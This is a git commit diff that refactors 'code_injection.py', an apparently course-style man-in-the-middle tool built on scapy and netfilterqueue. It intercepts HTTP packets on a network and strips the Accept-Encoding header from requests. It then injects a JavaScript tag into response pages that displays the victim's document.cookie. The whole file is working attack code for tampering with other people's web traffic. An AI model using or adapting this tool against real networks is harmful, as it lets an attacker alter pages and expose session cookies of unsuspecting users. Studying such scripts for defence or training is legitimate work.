c4e8b294ed6de73695ad9fe74ea851a1be622692
root <fonso.gonzalezsan@gmail.com>
2020-05-16 16:01:38 -0400

    refactor code injection program

--- code_injection.py
+++ code_injection.py
@@ -5,29 +5,32 @@ import scapy.all as scapy
 import re
 ack_list =[]
 
+def modify_load(scapy_packet, load):
+    scapy_packet[scapy.Raw].load = load
+    del scapy_packet[scapy.IP].len
+    del scapy_packet[scapy.IP].chksum
+    del scapy_packet[scapy.TCP].chksum
+    return scapy_packet
+
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
-        #print(scapy_packet.show())
+        origin_load = scapy_packet[scapy.Raw].load
+        load= origin_load
         if scapy_packet[scapy.TCP].dport == 80:
-            print("[+] request type  HTTP ")
-            modify_packet= re.sub("Accept-Encoding:.*?\\r\\n","",scapy_packet[scapy.Raw].load)
-            scapy_packet[scapy.Raw].load=modify_packet
-            del scapy_packet[scapy.IP].len
-            del scapy_packet[scapy.IP].chksum
-            del scapy_packet[scapy.TCP].chksum
-            #print(scapy_packet.show())
-            packet.set_payload(str(scapy_packet))
+            print("[+] Request type  HTTP ")
+            load= re.sub("Accept-Encoding:.*?\\r\\n","",scapy_packet[scapy.Raw].load)
+            scapy_packet = modify_load(scapy_packet, load)
+
         elif scapy_packet[scapy.TCP].sport == 80:
-            print("[+] response type HTTP ")
-            modify_packet = re.sub("<body ", "<script>alert('hacked!!! '+document.cookie);</script> <body", scapy_packet[scapy.Raw].load)
-            print(modify_packet)
-            scapy_packet[scapy.Raw].load = modify_packet
-            del scapy_packet[scapy.IP].len
-            del scapy_packet[scapy.IP].chksum
-            del scapy_packet[scapy.TCP].chksum
+            print("[+] Response type HTTP ")
+            load = re.sub("<body ", "<script>alert('hacked!!! '+document.cookie);</script> <body", scapy_packet[scapy.Raw].load)
+            scapy_packet= modify_load(scapy_packet, load)
+
+        if origin_load != load:
+            print(scapy_packet)
             packet.set_payload(str(scapy_packet))
-            #print(scapy_packet.show())
+
     packet.accept()
 
 queue = netfilterqueue.NetfilterQueue()
